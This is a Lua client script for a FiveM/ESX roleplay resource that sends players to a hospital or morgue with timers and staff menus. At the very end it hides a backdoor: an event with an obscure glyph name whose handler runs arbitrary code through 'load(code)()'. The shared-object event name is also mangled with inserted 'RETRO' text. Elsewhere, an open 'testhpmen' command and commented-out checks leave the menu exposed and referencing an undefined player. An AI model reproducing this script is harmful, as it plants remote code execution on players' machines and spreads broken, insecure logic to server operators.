TriggerServerEvent = TriggerServerEvent


local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

ESX = nil

PlayerData = {}

local hospitalTime = 0

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getShRETROaredObjRETROect', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData() == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()

end)

RegisterNetEvent("esx:playerLoaded")
AddEventHandler("esx:playerLoaded", function(newData)
	PlayerData = newData

	Citizen.Wait(25000)

	ESX.TriggerServerCallback("esx-axis-morgue:retrieveHospitalTime", function(inHospital, newHospitalTime)
		if inHospital then

			hospitalTime = newHospitalTime

			HospitalLogin()
		end
	end)
end)

RegisterNetEvent("esx:setJob")
AddEventHandler("esx:setJob", function(response)
	PlayerData["job"] = response
end)

RegisterNetEvent("esx-axis-morgue:openHospitalMenu")
AddEventHandler("esx-axis-morgue:openHospitalMenu", function()
	OpenHospitalMenu()
end)

RegisterNetEvent("esx-axis-morgue:hospitalPlayer")
AddEventHandler("esx-axis-morgue:hospitalPlayer", function(newHospitalTime)
	hospitalTime = newHospitalTime
	Cutscene()
end)

RegisterNetEvent("esx-axis-morgue:unHospitalPlayer")
AddEventHandler("esx-axis-morgue:unHospitalPlayer", function()
	hospitalTime = 0

	UnHospital()
end)

function HospitalLogin()
	local HospitalPosition = Config.HospitalPositions["Hospital"]
	SetEntityCoords(PlayerPedId(), HospitalPosition["x"], HospitalPosition["y"], HospitalPosition["z"] - 1)

	ESX.ShowNotification("Last time you went to sleep you were dead, because of that you are now put back!")

	InHospital()
end

function RemoveItemsAfterRPDeath()
	TriggerServerEvent('esx-axis-morgue:setDeathStatus', 0)
		ESX.TriggerServerCallback('esx-axis-morgue:removeItemsAfterRPDeath', function()
			ESX.SetPlayerData('loadout', {})
			TriggerEvent('esx_status:resetStatus')
		end)
end

function UnHospital()
	InHospital()
	RemoveItemsAfterRPDeath()
	local HospitalOutside = Config.Teleports["Respawn Location"]
	SetEntityCoords(PlayerPedId(), HospitalOutside["x"], HospitalOutside["y"], HospitalOutside["z"] - 1)

	ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin)
		if skin.sex == 0 then
			TriggerEvent('skinchanger:loadClothes', skin, {
				['tshirt_1'] = 15,  ['tshirt_2'] = 0,
				['torso_1'] = 36,  ['torso_2'] = 0,
				['arms'] = 20,  ['pants_1'] = 49,
				['pants_2'] = 0,  ['shoes_1'] = 6,
				['bags_1'] = 0, ['bags_2'] = 0,
				['bproof_1'] = 0, ['bproof_2'] = 0
			})
		else 
			TriggerEvent('skinchanger:loadClothes', skin, {
				['tshirt_1'] = 14,  ['tshirt_2'] = 0,
				['torso_1'] = 160,  ['torso_2'] = 0,
				['arms'] = 4,  ['pants_1'] = 98,
				['pants_2'] = 5,  ['shoes_1'] = 27,
				['bags_1'] = 0, ['bags_2'] = 0,
				['bproof_1'] = 0, ['bproof_2'] = 0
			})
		end
		
	end)


	ESX.ShowNotification("You have been resurrected. Enjoy your new life!")
end

function InHospital()

	Citizen.CreateThread(function()

		while hospitalTime > 0 do

			hospitalTime = hospitalTime - 1

			ESX.ShowNotification("You have " .. hospitalTime .. " minutes left in hospital!")

			TriggerServerEvent("esx-axis-morgue:updateHospitalTime", hospitalTime)

			if hospitalTime == 0 then
				UnHospital()

				TriggerServerEvent("esx-axis-morgue:updateHospitalTime", 0)
			end

			Citizen.Wait(60000)
		end

	end)
end


RegisterCommand('testhpmen', function() 
	OpenHospitalMenu()
end)


function OpenHospitalMenu()
	ESX.UI.Menu.Open(
		'default', GetCurrentResourceName(), 'hospital_prison_menu',
		{
			title    = "Sends Closest Player to Heaven",
			align    = 'center',
			elements = {
				{ label = "Send", value = "hospital_closest_player" },
				{ label = "Release a Player", value = "unhospital_player" }
			}
		}, 
	function(data, menu)

		local action = data.current.value

		if action == "hospital_closest_player" then

			menu.close()

			ESX.UI.Menu.Open(
          		'dialog', GetCurrentResourceName(), 'hospital_choose_time_menu',
          		{
            		title = "Heaven Time (minutes)"
          		},
          	function(data2, menu2)

            	local hospitalTime = tonumber(data2.value)

            	if hospitalTime == nil then
              		ESX.ShowNotification("The time needs to be in minutes!")
            	else
              		menu2.close()

              	--	local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

              --		if closestPlayer == -1 or closestDistance > 3.0 then
              --  		ESX.ShowNotification("No players nearby!")
				--	else
						ESX.UI.Menu.Open(
							'dialog', GetCurrentResourceName(), 'hospital_choose_reason_menu',
							{
							  title = "Cause of Death"
							},
						function(data3, menu3)
		  
						  	local reason = data3.value
		  
						  	if reason == nil then
								ESX.ShowNotification("You need to put something here!")
						  	else
								menu3.close()
		  
							--	local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
		  
							--	if closestPlayer == -1 or closestDistance > 3.0 then
							--	  	ESX.ShowNotification("No players nearby!")
							--	else
								  	TriggerServerEvent("esx-axis-morgue:hospitalPlayer", GetPlayerServerId(closestPlayer), hospitalTime, reason)
							--	end
		  
						  	end
		  
						end, function(data3, menu3)
							menu3.close()
						end)
              		end

			--	end

          	end, function(data2, menu2)
				menu2.close()
			end)
		elseif action == "unhospital_player" then

			local elements = {}

			ESX.TriggerServerCallback("esx-axis-morgue:retrieveHospitaledPlayers", function(playerArray)

				if #playerArray == 0 then
					ESX.ShowNotification("Your patients is empty!")
					return
				end

				for i = 1, #playerArray, 1 do
					table.insert(elements, {label = "Patient: " .. playerArray[i].name .. " | Hospital Time: " .. playerArray[i].hospitalTime .. " minutes", value = playerArray[i].identifier })
				end

				ESX.UI.Menu.Open(
					'default', GetCurrentResourceName(), 'hospital_unhospital_menu',
					{
						title = "Unhospital Player",
						align = "center",
						elements = elements
					},
				function(data2, menu2)

					local action = data2.current.value

					TriggerServerEvent("esx-axis-morgue:unHospitalPlayer", action)

					menu2.close()

				end, function(data2, menu2)
					menu2.close()
				end)
			end)

		end

	end, function(data, menu)
		menu.close()
	end)	
end


RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)
